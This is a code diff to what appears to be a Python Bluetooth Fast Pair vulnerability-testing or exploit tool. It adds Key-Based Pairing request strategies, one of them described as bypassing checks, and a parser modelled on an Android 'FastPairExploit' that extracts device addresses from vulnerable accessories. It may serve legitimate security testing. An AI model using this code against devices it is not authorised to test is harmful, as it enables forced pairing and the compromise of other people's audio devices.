@@ -84,10 +84,54 @@ class KeyBasedPairingRequest:
         provider_address: bytes,
         seeker_address: Optional[bytes] = None,
     ) -> "KeyBasedPairingRequest":
+        """
+        Build standard verification request matching Android VulnerabilityTester.kt:
+        Flags: 0x11 = INITIATE_BONDING (bit 0) | EXTENDED_RESPONSE (bit 4)
+        """
         return cls(
             provider_address=provider_address,
             seeker_address=seeker_address,
-            flags=PairingRequestFlags.INITIATE_BONDING,
+            flags=PairingRequestFlags.INITIATE_BONDING | PairingRequestFlags.EXTENDED_RESPONSE,
+        )
+
+    @classmethod
+    def strategy_raw_kbp(cls, provider_address: bytes) -> "KeyBasedPairingRequest":
+        """Strategy 1: RAW_KBP - Minimal raw request (works on most vulnerable devices)"""
+        return cls(
+            provider_address=provider_address,
+            seeker_address=None,
+            flags=PairingRequestFlags.INITIATE_BONDING | PairingRequestFlags.EXTENDED_RESPONSE,
+        )
+
+    @classmethod
+    def strategy_with_seeker(
+        cls, provider_address: bytes, seeker_address: bytes
+    ) -> "KeyBasedPairingRequest":
+        """Strategy 2: RAW_WITH_SEEKER - Includes seeker address for bonding"""
+        return cls(
+            provider_address=provider_address,
+            seeker_address=seeker_address,
+            flags=PairingRequestFlags.SEEKER_ADDRESS_PRESENT,
+        )
+
+    @classmethod
+    def strategy_retroactive(
+        cls, provider_address: bytes, seeker_address: bytes
+    ) -> "KeyBasedPairingRequest":
+        """Strategy 3: RETROACTIVE - Bypasses some checks (flags 0x0A = bit1 + bit3)"""
+        return cls(
+            provider_address=provider_address,
+            seeker_address=seeker_address,
+            flags=PairingRequestFlags.SEEKER_ADDRESS_PRESENT | PairingRequestFlags.ALT_SEEKER_ADDRESS,
+        )
+
+    @classmethod
+    def strategy_extended(cls, provider_address: bytes) -> "KeyBasedPairingRequest":
+        """Strategy 4: EXTENDED - Request extended response for newer devices"""
+        return cls(
+            provider_address=provider_address,
+            seeker_address=None,
+            flags=PairingRequestFlags.EXTENDED_RESPONSE,
         )
 
 
@@ -115,6 +159,64 @@ class KeyBasedPairingResponse:
     @property
     def provider_address_str(self) -> str:
         return ":".join(f"{b:02X}" for b in self.provider_address)
+
+
+def parse_kbp_response_multi_strategy(
+    data: bytes,
+    shared_secret: Optional[bytes] = None,
+) -> Optional[str]:
+    """
+    Multi-strategy response parser matching Android FastPairExploit.kt parseKbpResponse().
+    Tries multiple methods to extract BR/EDR address from response.
+    Returns MAC address string or None if extraction fails.
+    """
+    if len(data) < 7:
+        return None
+
+    def extract_address(d: bytes, offset: int) -> str:
+        if offset + 6 > len(d):
+            return "00:00:00:00:00:00"
+        return ":".join(f"{d[i]:02X}" for i in range(offset, offset + 6))
+
+    def is_valid_address(addr: str) -> bool:
+        if addr in ("00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"):
+            return False
+        parts = addr.split(":")
+        return len(parts) == 6 and all(len(p) == 2 for p in parts)
+
+    # Strategy 1: Standard response (type 0x01)
+    if data[0] in (0x01, MessageType.KEY_BASED_PAIRING_RESPONSE):
+        addr = extract_address(data, 1)
+        if is_valid_address(addr):
+            return addr
+
+    # Strategy 2: Extended response (type 0x02)
+    if data[0] == 0x02 and len(data) >= 9:
+        addr_count = data[2] & 0xFF
+        if addr_count >= 1:
+            addr = extract_address(data, 3)
+            if is_valid_address(addr):
+                return addr
+
+    # Strategy 3: Decrypt with shared secret
+    if shared_secret and len(shared_secret) >= 16:
+        try:
+            from .crypto import aes_128_decrypt
+            decrypted = aes_128_decrypt(shared_secret[:16], data)
+            if decrypted[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
+                addr = extract_address(decrypted, 1)
+                if is_valid_address(addr):
+                    return addr
+        except Exception:
+            pass
+
+    # Strategy 4: Brute force scan for valid MAC pattern
+    for offset in range(len(data) - 5):
+        addr = extract_address(data, offset)
+        if is_valid_address(addr):
+            return addr
+
+    return None
 
 
 @dataclass  
